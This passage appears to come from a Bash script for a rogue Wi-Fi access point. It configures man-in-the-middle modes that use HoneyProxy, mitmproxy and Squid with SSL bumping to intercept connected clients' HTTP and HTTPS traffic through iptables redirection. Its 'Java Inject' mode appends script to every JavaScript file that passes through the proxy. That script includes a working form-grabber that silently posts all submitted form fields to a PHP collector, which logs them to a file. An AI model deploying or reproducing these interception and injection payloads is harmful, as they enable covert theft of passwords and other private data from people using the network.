$cecho "SSL-based traffic: "$GREEN"HTTPS"$END""
$cecho "Don't forget to install the appropriate* CA certificate into the browser or operating system of your client(s)."
$cecho "*Please refer to :"$GREEN"$HOME_DIR//CA-certificates/README"$END" file"
$cecho "*Installing a personal CA certificate for Firefox,OSX,Windows 7,iPhone/iPad, IOS Simulator,Android:"
$cecho ""$BLUE"http://mitmproxy.org/doc/ssl.html"$END""
#$cecho ""$GREEN"How to distribute root certificates as exe files"$END""
#$cecho ""$BLUE"http://poweradmin.se/blog/2010/01/23/how-to-distribute-root-certificates-as-exe-files/"$END""
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# 						Mode: Honey Proxy						#
#														#
#	HoneyProxy is a lightweight man-in-the-middle proxy that helps you analyze HTTP(S) traffic flows. 	#
#	It is tailored to the needs of security researchers and allows both real-time and log analysis. 	#
#	Being compatible with [mitmproxy](http://mitmproxy.org/), it focuses on features that are useful in a 	#
#	forensic context and allows extended visualization capabilities.					#
#														#
# http://honeyproxy.org/											#
# http://mitmproxy.org/												#
# https://github.com/mitmproxy/mitmproxy									#
# http://0x32202.tumblr.com/post/54181737556									#
#################################################################################################################
if [ "$WLNMODE" = "HoneyProxy" ];then

# Let's create our directory for HoneyProxy (if it doesn't exist). $HOME_DIR/honeyproxy/
# Let's create our directory for MiTMproxy (if it doesn't exist). /root/.mitmproxy/

if [ ! -d $HOME_DIR/honeyproxy/ ];then
	mkdir $HOME_DIR/honeyproxy/
else
	# Clean everything
	rm -r -f $HOME_DIR/honeyproxy/
	mkdir $HOME_DIR/honeyproxy/
fi

# For some weird reason Mitmproxy and Honeyproxy doesn't like CA-Certs with a different filename other than
# mitmproxy-ca-cert.pem and other location that /root/.mitmproxy/.
# Create symbolic links to our certificates. We will not use mitmproxy's certificates
if [ ! -d /root/.mitmproxy/ ];then
	mkdir /root/.mitmproxy
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca.pem /root/.mitmproxy/mitmproxy-ca.pem
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.crt /root/.mitmproxy/mitmproxy-ca-cert.cer
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.p12 /root/.mitmproxy/mitmproxy-ca-cert.p12
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.pem /root/.mitmproxy/mitmproxy-ca-cert.pem
else
	rm -r -f /root/.mitmproxy/
	mkdir /root/.mitmproxy
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca.pem /root/.mitmproxy/mitmproxy-ca.pem
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.crt /root/.mitmproxy/mitmproxy-ca-cert.cer
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.p12 /root/.mitmproxy/mitmproxy-ca-cert.p12
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.pem /root/.mitmproxy/mitmproxy-ca-cert.pem
fi


# Let's create our directory for Honeyproxy (if it doesn't exist). $HOME_DIR/honeyproxy/.honeyproxy/
# Create symbolic links to our certificates. We will not use mitmproxy's certificates
if [ ! -d $HOME_DIR/honeyproxy/.honeyproxy/ ];then
	mkdir $HOME_DIR/honeyproxy/.honeyproxy
	mkdir $HOME_DIR/honeyproxy/.honeyproxy/dummy-certs/
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca.pem $HOME_DIR/honeyproxy/.honeyproxy/mitmproxy-ca.pem
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.crt $HOME_DIR/honeyproxy/.honeyproxy/mitmproxy-ca-cert.cer
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.p12 $HOME_DIR/honeyproxy/.honeyproxy/mitmproxy-ca-cert.p12
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.pem $HOME_DIR/honeyproxy/.honeyproxy/mitmproxy-ca-cert.pem
else
	rm -r -f $HOME_DIR/honeyproxy/.honeyproxy
	mkdir $HOME_DIR/honeyproxy/.honeyproxy
	mkdir $HOME_DIR/honeyproxy/.honeyproxy/dummy-certs/
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca.pem $HOME_DIR/honeyproxy/.honeyproxy/mitmproxy-ca.pem
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.crt $HOME_DIR/honeyproxy/.honeyproxy/mitmproxy-ca-cert.cer
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.p12 $HOME_DIR/honeyproxy/.honeyproxy/mitmproxy-ca-cert.p12
	ln -s $HOME_DIR/CA-certificates/$friendly_name-ca-cert.pem $HOME_DIR/honeyproxy/.honeyproxy/mitmproxy-ca-cert.pem
fi

# Start HoneyProxy: Address to bind proxy to $INETIP, Port 8080, in transparent proxy mode, try to convince servers to send us un-compressed data
# Log file $HOME_DIR/honeyproxy/traffic-dump.log, Folder to dump all response objects into $HOME_DIR/honeyproxy/sites/
# Configuration directory=$HOME_DIR/honeyproxy/.honeyproxy, User-created SSL certificate file=$HOME_DIR/honeyproxy/.honeyproxy/mitmproxy-ca-cert.pem
# Client certificate directory=$HOME_DIR/honeyproxy/.honeyproxy, generated dummy certs directory=$HOME_DIR/honeyproxy/.honeyproxy/dummy-certs
$necho "[....] Starting HoneyProxy."
xterm -geometry -0+0 -e "/usr/bin/python $HOME_DIR/.honeyproxy_prog/honeyproxy.py -a $INETIP -p 8080 -T -z -w $HOME_DIR/honeyproxy/traffic-dump.log --dump-dir $HOME_DIR/honeyproxy/sites/ --dummy-certs=$HOME_DIR/honeyproxy/.honeyproxy/dummy-certs"&
#xterm -geometry -0+0 -e "/usr/bin/python $HOME_DIR/.honeyproxy_prog/honeyproxy.py -a $INETIP -p 8080 -T -z -w $HOME_DIR/honeyproxy/traffic-dump.log --dump-dir $HOME_DIR/honeyproxy/sites/ --confdir=$HOME_DIR/honeyproxy/.honeyproxy --cert=$HOME_DIR/honeyproxy/.honeyproxy/mitmproxy-ca-cert.pem --client-certs=$HOME_DIR/honeyproxy/.honeyproxy --dummy-certs=$HOME_DIR/honeyproxy/.honeyproxy/dummy-certs"&
#xterm -geometry 160x40-0+0 -e "mitmproxy --debug -w $HOME_DIR/mitmproxy/mitmproxy.log -T -z --palette=dark -p 8080"&
# No Transparent
#xterm -geometry -0+0 -e "/usr/bin/python $HOME_DIR/.honeyproxy_prog/honeyproxy.py -a $INETIP -p 8080 -T -z -w $HOME_DIR/honeyproxy/traffic-dump.log --dump-dir $HOME_DIR/honeyproxy/sites/ --dummy-certs=/root/.mitmproxy/dummy-certs"&

$cecho "\r[ "$GREEN"ok"$END" ] Starting HoneyProxy."

# iptables DNS to our inet addr. 
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP

# Plain text traffic on ports: [HTTP (80) are redirected to port 8080.
# Packets for SSL-based traffic on ports: HTTPS (443) are redirected to port 8080.
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp -m multiport --dports 80,443 -j DNAT --to-destination $INETIP:8080
iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp -m multiport --dports 80,443 -j REDIRECT --to-ports 8080

echo
$cecho "Your clients can now surf the web and we Transparently sniffing:"
$cecho "non-SSL traffic  : "$GREEN"HTTP"$END" and"
$cecho "SSL-based traffic: "$GREEN"HTTPS"$END""
$cecho "Don't forget to install the appropriate* CA certificate into the browser or operating system of your client(s)."
$cecho "*Please refer to :"$GREEN"$HOME_DIR//CA-certificates/README"$END" file"
$cecho "*Installing a personal CA certificate for Firefox,OSX,Windows 7,iPhone/iPad, IOS Simulator,Android:"
$cecho ""$BLUE"http://mitmproxy.org/doc/ssl.html"$END""
#$cecho ""$GREEN"How to distribute root certificates as exe files"$END""
#$cecho ""$BLUE"http://poweradmin.se/blog/2010/01/23/how-to-distribute-root-certificates-as-exe-files/"$END""
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# 					Mode: Squid in The Middle						#
#														#
#	http://www.mydlp.com/how-to-configure-squid-3-2-ssl-bumping-dynamic-ssl-certificate-generation/		#
#################################################################################################################
if [ "$WLNMODE" = "Squid_iTM" ];then

#Clean up dynamically generated certificates folder.
if [ -d "/var/lib/ssl_db" ];then
	rm -f -r /var/lib/ssl_db
fi


# Default folder needs to be created, for the dynamically generated certificates.
if [ ! -d /var/lib/ssl_db ];then
	/usr/lib/squid3/ssl_crtd -c -s /var/lib/ssl_db -M 4MB
	chown -R proxy.proxy /var/lib/ssl_db
fi

# Create custom squid.conf and replace the original.
# HTTP proxy runs at 3128, Transparent HTTP runs at 3129 and Transparent HTTPS runs at 3127
# localhost can access HTTP proxy at 3128

cat > /etc/squid3/squid.conf <<EOF
# Access Controls
acl localnet src 192.168.60.0/24  	# RFC1918 class C internal network (192.168.60.0 to 192.168.60.255)
acl safeports port 21 70 80 210 280 443 488 563 591 631 777 901 81 3127-3129 1025-65535
acl sslports port 443 563 81 2087 8081 10000
acl connect method CONNECT
http_access allow manager localhost
http_access deny manager
http_access deny !safeports
http_access deny CONNECT !sslports
http_access allow localhost
http_access allow localnet
http_access deny all

always_direct allow all
ssl_bump server-first all

# Ports :3127 http proxy, 3128 http transparent, 3129 https transparent.
http_port 3127
http_port 3128 intercept
https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB cert=$HOME_DIR/CA-certificates/$friendly_name-ca.pem key=$HOME_DIR/CA-certificates/$friendly_name-ca.pem

sslcrtd_program /usr/lib/squid3/ssl_crtd -s /var/lib/ssl_db -M 4MB
sslcrtd_children $rdr_chil startup=$rdr_chil_strup idle=$rdr_chil_idle

# Lets use DNS servers that we have found.
dns_nameservers $DNS1 $DNS2
positive_dns_ttl 8 hours
negative_dns_ttl 30 seconds
hierarchy_stoplist cgi-bin ?

# Disk Cache Options (Get values from Free Disk/Memory calculation section)
#cache_dir $file_system /var/spool/squid3 $squid_hdd 16 256
#cache_replacement_policy heap LFUDA
#minimum_object_size 0 KB
#maximum_object_size $squid_max_obj_size
#cache_swap_low 90
#cache_swap_high 95

# Memory Cache Options (Get values from Free Disk/Memory calculation section)
cache_mem $squid_mem MB
maximum_object_size_in_memory $squid_max_obj_size_mem
memory_replacement_policy heap GDSF

refresh_pattern ^ftp:		1440	20%	10080
refresh_pattern ^gopher:	1440	0%	1440
refresh_pattern -i (/cgi-bin/|\?) 0	0%	0
refresh_pattern .		0	20%	4320
coredump_dir /var/spool/squid3
access_log stdio:/var/log/squid3/access.log squid
EOF

if [ -n "`pidof squid3`" ];then
	squid3 -k reconfigure
	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid3/squid.conf"
else
	/etc/init.d/squid3 restart
	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid3/squid.conf"
fi

# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
if [  ! -d /var/www/sarg-realtime  ];then
	mkdir /var/www/sarg-realtime
	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
	chown -R www-data:www-data /var/www
	chmod -R 1777 /var/www
	usermod -aG proxy www-data
fi

# Start apache2 so it can serve real time reports from SARG to our localhost.
/etc/init.d/apache2 start
$cecho "[ "$GREEN"ok"$END" ] Apache2 conf file: /etc/apache2/apache2.conf"

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP
# Transparent Squid3 Http & Https (Squid3 listens to 3129 (http traffic) and 3127 (https traffic)
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.60.129:3128
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp --dport 443 -j DNAT --to-destination 192.168.60.129:3129
iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 3128
iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp --dport 443 -j REDIRECT --to-ports 3129
# Start Sarg. Create real time reports
sleep 3
$necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
sarg -r > /dev/null &
$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
$cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"

echo
$cecho "Your clients are now Transparently HTTP and HTTPS Proxied."
$cecho "Don't forget to install the appropriate* CA certificate into the browser or operating system of your client(s)."
$cecho "*Please refer to :"$GREEN"$HOME_DIR//CA-certificates/README"$END" file"
$cecho "*Installing a personal CA certificate for Firefox,OSX,Windows 7,iPhone/iPad, IOS Simulator,Android:"
$cecho ""$BLUE"http://mitmproxy.org/doc/ssl.html"$END""
$cecho "To see a more detailed but static (not real time) report about who-when is connected and what was visited,"
$cecho "top sites, sites & users please type in a console "$RED"'" sarg -x -z "'"$END"." 
$cecho "Then go to $HOME_DIR/squid-reports and open index.html."
$cecho ""$GREEN"http and https sites"$END" will get affected."
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi

#################################################################################################################
# 		Mode "Java Inject" :Squid will inject each javascript file passing through the proxy.	 	#
#														#
# By default you will find 2 scripts as an example: pasarela_get_submit and pasarela_xss			#
# pasarela_xss is a simple script that inject an annoying alert with the message XSS.				#
# pasarela_get_submit is a script that captures the submitted form content without being noticed by the user.	#
# The captured content can be found in: $HOME_DIR/Java_Inject/captured_data.txt					#
#														#
# https://github.com/xtr4nge/FruityWifi/wiki/Tutorial-%28Squid%29						#
# http://media.blackhat.com/bh-us-12/Briefings/Alonso/BH_US_12_Alonso_Owning_Bad_Guys_WP.pdf			#
#################################################################################################################
if [ "$WLNMODE" = "Java_Inject" ];then

# Make dir /Java_Inject/ in $HOME_DIR or clean it.
if [ ! -d $HOME_DIR/Java_Inject ];then
	mkdir $HOME_DIR/Java_Inject
else 
	rm -r -f $HOME_DIR/Java_Inject/*
fi


# Make dir /var/www/inject or clean it.
if [ ! -d /var/www/inject ];then
	mkdir /var/www/inject
else 
	rm -r -f /var/www/inject/*
fi

# Which Java script code we should use?
if [ "$Java_script" = "1" ];then
cat > $HOME_DIR/Java_Inject/pasarela.js << EOF
;
alert('$friendly_name Script - It could be worse... ');
EOF
elif [ "$Java_script" = "2" ];then

cat > $HOME_DIR/Java_Inject/pasarela.js << EOF
;
function kLogStart()
{
	var forms = parent.document.getElementsByTagName("form");
	for (i=0; i < forms.length; i++) 
	{
		forms[i].addEventListener('submit', function() {
			var cadena = "";
			var forms = parent.document.getElementsByTagName("form");
	
			for (x=0; x < forms.length; x++)
			{
				var elements = forms[x].elements;
				for (e=0; e < elements.length; e++)
				{
					cadena += elements[e].name + "::" + elements[e].value + "||";
				}
				//alert(cadena);
			}
			//alert(cadena);
			attachForm(cadena);
		}, false);
		}
}

function attachForm(cadena) 
{
	//ajaxFunction(cadena);
	AJAXPost(cadena);
}

function AJAXPost(cadena)
{

	if (window.XMLHttpRequest){// code for IE7+, Firefox, Chrome, Opera, Safari
	xmlhttp = new XMLHttpRequest();
	} else {// code for IE6, IE5
        xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
   
    var params = "v=" + cadena;

    xmlhttp.open("POST","http://192.168.60.129/inject/getData.php",false);
    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    //xmlhttp.setRequestHeader("Content-length", params.length);
    //xmlhttp.setRequestHeader("Connection", "close");
	xmlhttp.send(params);
    return xmlhttp.responseText;    
}

kLogStart();
EOF

cat > /var/www/inject/getData.php << "EOF"
<?
//$getData = $_GET["v"];
$getData = $_POST["v"];

$myFile = "captured_data.txt";
$fh = fopen($myFile, 'a') or die("can't open file");

$stringData = $getData . "\n";

fwrite($fh, $stringData);
fclose($fh);

?>
EOF
	if [ -f $HOME_DIR/Java_Inject/captured_data.txt ];then
		cat /dev/null > $HOME_DIR/Java_Inject/captured_data.txt
	else
		touch $HOME_DIR/Java_Inject/captured_data.txt
	fi
	chown www-data.www-data /var/www/inject
	chown -R www-data:www-data $HOME_DIR/Java_Inject/captured_data.txt
	#chmod -R 1777 $HOME_DIR/Java_Inject/captured_data.txt
	chmod 777 /$HOME_DIR/Java_Inject/captured_data.txt
	#Replace $HOME_DIR with "$HOME_DIR" :-)
	sed 's%$myFile = "captured_data.txt";%$myFile = "'$HOME_DIR'/Java_Inject/captured_data.txt";%g' /var/www/inject/getData.php > /var/www/inject/getData.php1 && mv /var/www/inject/getData.php1 /var/www/inject/getData.php
elif [ "$Java_script" = "3" ];then
	cp $custom_Java_script $HOME_DIR/Java_Inject/pasarela.js
fi

# Create our redirect script.
cat > /usr/local/bin/redirect.pl << "EOF"
#!/usr/bin/perl
# REF: https://github.com/xtr4nge/FruityWifi/wiki/Tutorial-%28Squid%29
# REF: http://media.blackhat.com/bh-us-12/Briefings/Alonso/BH_US_12_Alonso_Owning_Bad_Guys_WP.pdf

$|=1;
$count = 0;
$pid = $$;

while (<>)
{
	chomp $_;
	if ($_ =~ /(.*\.js)/i)
	{
	
		$url = $1;
		system("/usr/bin/wget", "-q", "-O", "/var/www/tmp/$pid-$count.js", "$url");
		system("chmod o+r /var/www/tmp/$pid-$count.js");
		system("cat $HOME_DIR/Java_Inject/pasarela.js >> /var/www/tmp/$pid-$count.js");
		print "http://192.168.60.129/tmp/$pid-$count.js\n";
	}
	else
	{
		print "$_\n";
	}
	$count++;
}
EOF

#Replace $HOME_DIR with "$HOME_DIR" :-)
# See above cat.... "EOF"
sed 's%system("cat $HOME_DIR/Java_Inject/pasarela.js >> /var/www/tmp/$pid-$count.js");%system("cat '$HOME_DIR'/Java_Inject/pasarela.js >> /var/www/tmp/$pid-$count.js");%g' /usr/local/bin/redirect.pl > /usr/local/bin/redirect1.pl && mv /usr/local/bin/redirect1.pl /usr/local/bin/redirect.pl

# Make it executable
chmod 755 /usr/local/bin/redirect.pl


# Make dir /tmp/ in /var/www/ and if exist erase it's contents
if [ ! -d /var/www/tmp ];then
	mkdir /var/www/tmp
	chown -R www-data:www-data /var/www
	chmod -R 1777 /var/www
	usermod -aG proxy www-data
else
	rm -r -f /var/www/tmp/*
fi

# Make dir /sarg-realtime in /var/www/ Copy sarg-realtime.php to /var/www/sarg-realtime/ 
if [  ! -d /var/www/sarg-realtime  ];then
	mkdir /var/www/sarg-realtime
	cp /usr/share/sarg/sarg-php/sarg-realtime.php /var/www/sarg-realtime/ 
	chown -R www-data:www-data /var/www
	chmod -R 1777 /var/www
	usermod -aG proxy www-data
fi

# Activate our redirect script in squid3.conf
# url_rewrite_program /usr/local/bin/redirect.pl
# redirect_children 
sed 's%#url_rewrite_program %url_rewrite_program %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf
sed 's%#redirect_children %redirect_children %g' /etc/squid3/squid.conf > /etc/squid3/squid1.conf && mv /etc/squid3/squid1.conf /etc/squid3/squid.conf

# Start apache2 so it can serve real time reports from SARG to our localhost.
/etc/init.d/apache2 start
$cecho "[ "$GREEN"ok"$END" ] Apache2 conf file: /etc/apache2/apache2.conf"

if [ -n "`pidof squid3`" ];then
	squid3 -k reconfigure
	$cecho "[ "$GREEN"ok"$END" ] Squid3 conf file: /etc/squid3/squid.conf"
	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
else
	/etc/init.d/squid3 restart
	$cecho "[ "$GREEN"ok"$END" ] Squid HTTP Proxy 3.x conf file: /etc/squid3/squid.conf"
	$cecho "[ "$GREEN"ok"$END" ] Squid3 redirect script: /usr/local/bin/redirect.pl"
fi

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --table nat --append POSTROUTING --out-interface $IFACE -j MASQUERADE
iptables --append FORWARD --in-interface $ATFACE -j ACCEPT
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to $INETIP

#Transparent Squid3
iptables -t nat -A PREROUTING -i $ATFACE -p tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.60.129:3128
iptables -t nat -A PREROUTING -i $IFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 3128

# Start Sarg. Create real time reports
sleep 3
$necho "[....] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
sarg -r > /dev/null &
$browser http://127.0.0.1/sarg-realtime/sarg-realtime.php &
$cecho "\r[ "$GREEN"ok"$END" ] Starting SARG - Real Time Reports.(conf file: /etc/sarg/sarg.conf)"
echo
$cecho "Your clients are now Transparently HTTP Proxied "$RED"BUT"$END" Squid will inject each"
$cecho "java script file passing through the proxy."
if [ "$Java_script" = "1" ] || [ "$Java_script" = "2" ];then
	echo "Using Java script file: "$GREEN"$HOME_DIR/Java_Inject/pasarela.js"$END""
elif [ "$Java_script" = "3" ];then
	echo "Your Java script file copied and renamed to : "$GREEN"$HOME_DIR/Java_Inject/pasarela.js"$END""
fi
echo
$cecho ""$RED"To take affect, don't forget to clean up your clients browser's cache."$END""
$cecho "To see a more detailed but static (not real time) report about who-when is connected and what was visited,"
$cecho "top sites, sites & users please type in a console "$RED"'" sarg -x -z "'"$END"." 
$cecho "Then go to $HOME_DIR/squid-reports and open index.html."
$cecho "Only "$GREEN"http sites"$END" will get affected. The script has no affect to "$RED"https sites"$END"."
WPS_PIN_COMMAND
Who_is_connected_and_statistics
fi
